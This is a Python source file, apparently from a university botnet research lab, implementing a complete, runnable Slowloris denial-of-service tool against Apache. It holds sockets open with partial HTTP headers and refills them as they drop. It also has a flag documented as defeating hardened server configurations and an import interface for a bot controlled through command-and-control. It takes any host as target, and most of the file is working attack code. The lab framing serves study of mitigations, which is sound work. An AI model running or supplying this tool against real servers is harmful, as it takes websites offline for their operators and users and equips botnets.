"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Slowloris HTTP Exhaustion Attack
 Environment: ISOLATED VM LAB ONLY
              Target: Apache on 192.168.100.20:80
====================================================

Slowloris opens many TCP connections and drips one keep-alive
HTTP header line (e.g. "X-a: 1234\r\n") every few seconds,
never completing the request with the final blank line. Apache's
fixed thread pool exhausts itself holding these "legitimate-looking"
connections open because each one looks like a slow-but-in-progress
HTTP client.

Key teaching point: Nginx (event-driven) is immune.
Apache (thread-per-connection) is not.

Gaps closed in this revision
─────────────────────────────
Gap 1  --duration CLI flag
         run_full_lab.sh dispatches {"duration":30} via C2; the
         bot task dispatcher must be able to pass --duration N on
         the command line when invoking slowloris.py directly.
         Without this the process ran forever and had to be SIGKILLed,
         leaving sockets in CLOSE_WAIT and breaking lab timing.

Gap 2  Graceful socket cleanup on KeyboardInterrupt / SystemExit
         Previously the except block broke out of the loop without
         closing any of the open sockets, which lingered in
         CLOSE_WAIT on the server and made IDS measurement noisy.

Gap 3  --http10 fallback flag
         Some Apache configurations reply to HTTP/1.1 with
         "Connection: close", which immediately closes the socket
         and silently defeats the attack in the lab. --http10 sends
         HTTP/1.0 + "Connection: keep-alive", which forces
         persistent behaviour even on those hardened configs.

Gap 4  Per-run statistics printed on exit (JSON line on stdout)
         elapsed, sockets_created, reconnects, peak_sockets,
         failed_attempts, iterations — one parseable line that
         generate_graphs.py and run_full_lab.sh can consume.

Gap 5  --connlimit-test measurement mode
         Opens the full socket pool without sending any attack
         traffic. Counts how many succeed. Run BEFORE and AFTER
         enabling the Apache mitigation to produce a concrete
         "mitigation factor" percentage for research graphs.

Importable interface (unchanged — covert_bot.py uses this):
    from slowloris import slowloris
    slowloris(target_ip, target_port, num_sockets=150, duration=60)
"""

import argparse
import json
import logging
import random
import socket
import sys
import time

# ── Default constants ──────────────────────────────────────────
DEFAULT_IP      = "192.168.100.20"
DEFAULT_PORT    = 80
DEFAULT_SOCKETS = 150
DEFAULT_SLEEP   = 10   # seconds between keep-alive header drips

logging.basicConfig(
    level=logging.INFO,
    format="[Slowloris %(asctime)s] %(message)s",
    datefmt="%H:%M:%S",
)


# ══════════════════════════════════════════════════════════════
#  SOCKET FACTORY
# ══════════════════════════════════════════════════════════════

def create_socket(target_ip: str, target_port: int,
                  use_http10: bool = False) -> socket.socket | None:
    """
    Open a TCP connection and send a partial HTTP GET header.
    The request is deliberately left incomplete — no final blank
    line (\\r\\n\\r\\n) is ever sent, so Apache holds the thread
    open waiting for the rest of the headers.

    Gap 3: use_http10=True sends HTTP/1.0 + Connection: keep-alive
    to defeat configurations that reply to HTTP/1.1 with
    "Connection: close".
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((target_ip, target_port))

        if use_http10:
            version    = "HTTP/1.0"
            extra_hdr  = "Connection: keep-alive\r\n"
        else:
            version    = "HTTP/1.1"
            extra_hdr  = ""

        s.send(
            f"GET /?{random.randint(0, 99999)} {version}\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept-language: en-US,en;q=0.5\r\n"
            f"{extra_hdr}"
            .encode("utf-8")
        )
        # Deliberately DO NOT send the final \r\n that would
        # complete the headers — this is the attack's core mechanism.
        return s

    except socket.error:
        s.close()
        return None


# ══════════════════════════════════════════════════════════════
#  CONNLIMIT TEST  (Gap 5)
# ══════════════════════════════════════════════════════════════

def connlimit_test(target_ip: str, target_port: int,
                   num_sockets: int, use_http10: bool) -> dict:
    """
    Gap 5: Measurement mode — open the full socket pool without
    sending keep-alive traffic, then immediately close everything.

    Returns a dict with the count of successful connections so
    run_full_lab.sh can compute before/after mitigation factor:

        factor = (before - after) / before * 100  → % reduction
    """
    logging.info("[connlimit-test] Opening %d sockets to %s:%d",
                 num_sockets, target_ip, target_port)
    sockets  = []
    failures = 0

    for i in range(num_sockets):
        s = create_socket(target_ip, target_port, use_http10)
        if s:
            sockets.append(s)
        else:
            failures += 1

    succeeded = len(sockets)
    logging.info("[connlimit-test] %d/%d sockets succeeded (%d failed)",
                 succeeded, num_sockets, failures)

    # Close everything cleanly
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    result = {
        "mode":      "connlimit_test",
        "target":    f"{target_ip}:{target_port}",
        "attempted": num_sockets,
        "succeeded": succeeded,
        "failed":    failures,
        "pct_open":  round(succeeded / num_sockets * 100, 1),
    }
    # Gap 4 convention: single JSON line that scripts can grep/parse
    print(f"[SLOWLORIS_STATS] {json.dumps(result)}")
    return result


# ══════════════════════════════════════════════════════════════
#  MAIN ATTACK FUNCTION  (importable interface preserved)
# ══════════════════════════════════════════════════════════════

def slowloris(target_ip: str  = DEFAULT_IP,
              target_port: int = DEFAULT_PORT,
              num_sockets: int = DEFAULT_SOCKETS,
              duration: int    = 60,
              sleep_time: int  = DEFAULT_SLEEP,
              use_http10: bool = False) -> dict:
    """
    Maintain `num_sockets` half-open connections against target.

    Every `sleep_time` seconds, send one keep-alive header line
    ("X-a: <random_int>\\r\\n") to each socket to prevent Apache's
    timeout from closing it, while never completing the HTTP request.
    This drains the server's thread pool without generating the
    volumetric traffic signature of a SYN or UDP flood.

    Returns a stats dict (also printed as JSON on stdout).
    Importable from covert_bot.py:
        from slowloris import slowloris
        slowloris(target, port, 150, duration)
    """
    logging.info("Starting Slowloris -> %s:%d", target_ip, target_port)
    logging.info("Target sockets: %d  |  Duration: %ds  |  HTTP: %s",
                 num_sockets, duration,
                 "1.0+keep-alive" if use_http10 else "1.1")

    # ── Stats tracking (Gap 4) ─────────────────────────────────
    stats = {
        "mode":            "attack",
        "target":          f"{target_ip}:{target_port}",
        "elapsed":         0.0,
        "sockets_created": 0,
        "reconnects":      0,
        "peak_sockets":    0,
        "failed_attempts": 0,
        "iterations":      0,
    }

    sockets: list[socket.socket] = []
    start_time = time.time()

    # ── Phase 1: open initial socket pool ─────────────────────
    logging.info("Opening socket pool...")
    for _ in range(num_sockets):
        s = create_socket(target_ip, target_port, use_http10)
        if s:
            sockets.append(s)
            stats["sockets_created"] += 1
        else:
            stats["failed_attempts"] += 1

    stats["peak_sockets"] = len(sockets)
    logging.info("Opened %d sockets. Entering keep-alive loop.", len(sockets))

    end_time = start_time + duration

    # ── Phase 2: keep-alive drip loop ─────────────────────────
    try:
        while time.time() < end_time:
            logging.info("Active sockets: %d / %d", len(sockets), num_sockets)
            stats["iterations"] += 1

            dead = []
            for s in sockets:
                try:
                    s.send(
                        f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8")
                    )
                except socket.error:
                    dead.append(s)

            # Remove dead sockets
            for s in dead:
                sockets.remove(s)
                try:
                    s.close()
                except Exception:
                    pass

            # Refill to maintain the target count
            refill_count = num_sockets - len(sockets)
            for _ in range(refill_count):
                s = create_socket(target_ip, target_port, use_http10)
                if s:
                    sockets.append(s)
                    stats["sockets_created"] += 1
                    stats["reconnects"]       += 1
                else:
                    stats["failed_attempts"] += 1

            if len(sockets) > stats["peak_sockets"]:
                stats["peak_sockets"] = len(sockets)

            time.sleep(sleep_time)

    except (KeyboardInterrupt, SystemExit):
        # Gap 2: explicit socket cleanup on interrupt.
        # Without this, sockets linger in CLOSE_WAIT on the server,
        # polluting the next test run's baseline measurements.
        logging.info(
            "Interrupted — closing %d open sockets cleanly.", len(sockets)
        )
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        sockets.clear()

    else:
        # Normal duration-based exit
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        sockets.clear()

    # ── Gap 4: emit stats ──────────────────────────────────────
    stats["elapsed"] = round(time.time() - start_time, 1)
    logging.info(
        "Slowloris complete. elapsed=%.1fs  sockets_created=%d  "
        "reconnects=%d  peak=%d  failed=%d  iterations=%d",
        stats["elapsed"], stats["sockets_created"], stats["reconnects"],
        stats["peak_sockets"], stats["failed_attempts"], stats["iterations"],
    )
    # Single parseable JSON line — grep for [SLOWLORIS_STATS]
    print(f"[SLOWLORIS_STATS] {json.dumps(stats)}")
    return stats


# ══════════════════════════════════════════════════════════════
#  CLI ENTRY POINT  (Gap 1)
# ══════════════════════════════════════════════════════════════

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Slowloris — HTTP connection exhaustion (AUA lab)"
    )
    p.add_argument(
        "host", nargs="?",
        default=DEFAULT_IP,
        help="Target IP or hostname (default: 192.168.100.20)",
    )
    p.add_argument(
        "-p", "--port",
        type=int, default=DEFAULT_PORT,
        help="Target port (default: 80)",
    )
    p.add_argument(
        "-s", "--sockets",
        type=int, default=DEFAULT_SOCKETS,
        help="Number of half-open connections to maintain (default: 150)",
    )
    # Gap 1 ─────────────────────────────────────────────────────
    p.add_argument(
        "--duration",
        type=int, default=0,
        dest="duration",
        help=(
            "Stop after this many seconds (default: 0 = run indefinitely). "
            "run_full_lab.sh dispatches {\"duration\":30} in the C2 task JSON; "
            "the bot dispatcher passes --duration 30 on the CLI."
        ),
    )
    # Gap 3 ─────────────────────────────────────────────────────
    p.add_argument(
        "--http10",
        action="store_true",
        dest="http10",
        help=(
            "Send HTTP/1.0 + Connection: keep-alive instead of HTTP/1.1. "
            "Use when the target Apache config responds to HTTP/1.1 with "
            "Connection: close, which silently defeats the attack."
        ),
    )
    # Gap 5 ─────────────────────────────────────────────────────
    p.add_argument(
        "--connlimit-test",
        action="store_true",
        dest="connlimit_test",
        help=(
            "Measurement mode: open the full socket pool without attack "
            "traffic, count successes, then exit. Run before and after "
            "enabling Apache mitigation to compute a mitigation factor."
        ),
    )
    p.add_argument(
        "--sleeptime",
        type=int, default=DEFAULT_SLEEP,
        dest="sleeptime",
        help="Seconds between keep-alive header drips (default: 10)",
    )
    p.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable DEBUG logging",
    )
    return p


def main() -> None:
    parser = _build_parser()
    args   = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Gap 5: connlimit-test measurement mode
    if args.connlimit_test:
        result = connlimit_test(
            target_ip   = args.host,
            target_port = args.port,
            num_sockets = args.sockets,
            use_http10  = args.http10,
        )
        sys.exit(0 if result["succeeded"] > 0 else 1)

    # Gap 1: resolve duration=0 → effectively infinite
    if args.duration > 0:
        effective_duration = args.duration
    else:
        # 24 h cap — prevents truly infinite runs in lab env
        effective_duration = 86_400

    slowloris(
        target_ip   = args.host,
        target_port = args.port,
        num_sockets = args.sockets,
        duration    = effective_duration,
        sleep_time  = args.sleeptime,
        use_http10  = args.http10,
    )


if __name__ == "__main__":
    main()